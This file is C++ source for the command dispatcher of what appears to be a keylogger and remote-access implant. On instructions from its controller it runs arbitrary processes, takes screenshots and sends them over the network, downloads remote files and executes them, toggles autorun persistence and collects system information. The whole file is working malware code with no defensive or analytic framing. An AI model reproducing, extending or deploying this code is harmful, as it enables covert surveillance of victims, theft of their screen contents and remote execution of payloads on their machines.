#include "stdafx.h"
#include "CommandExe.h"
#include "Hax.h"
#include "Keylogger.h"
#include "Network.h"
#include "Screenshot.h"
#include "Settings.h"
#include "Info.h"
#include "Util.h"

struct command_t {
	std::string name;
	std::function<void(std::vector<std::string>)> func;
};

command_t commandDefs[] = {
		{
			"batch", [](std::vector<std::string> args) {
				if (!args.size())
					return;

				std::string fileArgs = Util::join_at_index(args, " ");
				TCHAR dest[_MAX_PATH];
#ifdef UNICODE
				mbstowcs(dest, fileArgs.c_str(), _MAX_PATH);
#else
				strcpy_s(dest, fileArgs.c_str());
#endif

				PROCESS_INFORMATION pi;
				STARTUPINFO si;
				ZeroMemory(&pi, sizeof(pi));
				ZeroMemory(&si, sizeof(si));
				si.cb = sizeof(si);

				BOOL ret = CreateProcess(NULL, dest, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
				if (!ret)
				{
					Error(_T("batch: Failed to create process"));
					return;
				}
			}
		},
		{
			"msgbox", [](std::vector<std::string> args) {
				if (!args.size())
					return;

				std::string msgboxText = Util::join_at_index(args, " ");
				wchar_t text[1024];
				mbstowcs(text, msgboxText.c_str(), 1024);
				MessageBoxW(NULL, text, NULL, MB_OK);
			}
		},
		{
			"screenshot", [](std::vector<std::string> args) {

				screenshot.TakeScreenshot(V_FAKE_TMP1);

				FILE *fp;
				errno_t error = _tfopen_s(&fp, V_FAKE_TMP1, _T("rb"));
				if (error != 0) {
					Error(_T("_tfopen failed"));
					goto g_1;
				}

				fseek(fp, 0, SEEK_END);
				size_t size = ftell(fp);
				fseek(fp, 0, SEEK_SET);


				char* buffer = (char*)malloc(size);
				if (!buffer)
				{
					Error(_T("Couldn't allocate buffer"));
					goto g_2;
				}

				if (fread_s(buffer, size, 1, size, fp) != size)
				{
					Error(_T("fread_s did not return size"));
					goto g_3;
				}

				network.SendFile(V_NET_FILE_DATA, size, buffer);

				g_3:	free(buffer);
				g_2:	fclose(fp);
				g_1:	DeleteFile(V_FAKE_TMP1);
			}
		},
		{
			"remove", [](std::vector<std::string> args) {
				keylogger.SetAutorun(false);
			}
		},
		{
			"exit", [](std::vector<std::string> args) {
				keylogger.Stop();
			}
		},
		{
			"exec", [](std::vector<std::string> args) {

				if (args.size() < 1)
					return;

				if (args[0].size() < 1)
					return;

				const char *file_path = args[0].c_str();
				const char *file_name = PathFindFileNameA(file_path);

				size_t resp_len;
				char *resp;
				network.GetFile(file_path, &resp_len, &resp);

				HANDLE hFile = CreateFileA(file_name, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
				if(hFile == INVALID_HANDLE_VALUE)
				{
					Error(_T("exec: Failed to create file"));
					goto g_1;
				}
				DWORD written;
				WriteFile(hFile, resp, resp_len, &written, 0);
				if (written != resp_len)
				{
					Error(_T("exec: Written differs from buffer length"));
					CloseHandle(hFile);
					goto g_2;
				}
				
				CloseHandle(hFile);


				PROCESS_INFORMATION pi;
				STARTUPINFOA si;
				ZeroMemory(&pi, sizeof(pi));
				ZeroMemory(&si, sizeof(si));
				si.cb = sizeof(si);

				BOOL ret = CreateProcessA(file_name, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
				if (!ret)
				{
					Error(_T("exec: Failed to create process"));
					goto g_2;
				}

				g_2: DeleteFileA(file_name);
				g_1: free(resp);
			}
		},
		{
			"info", [&](std::vector<std::string> args) {
				std::string osInfo = info.GetInformation();

				// Send
			}
		}
};

CommandExe::CommandExe()
{

}

CommandExe::~CommandExe()
{

}

void CommandExe::Run(std::string cmds)
{
	if (cmds.size() == 0) {
		return;
	}

	std::vector<std::string> commands = Util::split(cmds, ';');
	for (auto &cmd : commands) {
		std::vector<std::string> args = Util::split(cmd, ' ');
		args.erase(std::remove_if(args.begin(), args.end(), [&](const std::string &s) { return std::all_of(s.begin(), s.end(), isspace); }), args.end());
		if (args.size()) {
			auto result = std::find_if(std::begin(commandDefs), std::end(commandDefs), [&](const command_t & cmd) { return cmd.name == args[0].c_str(); });
			if (result != std::end(commandDefs)) {
				(*result).func(Util::split(Util::join_at_index(args, " ", 1), ' '));
			}
		}
	}
}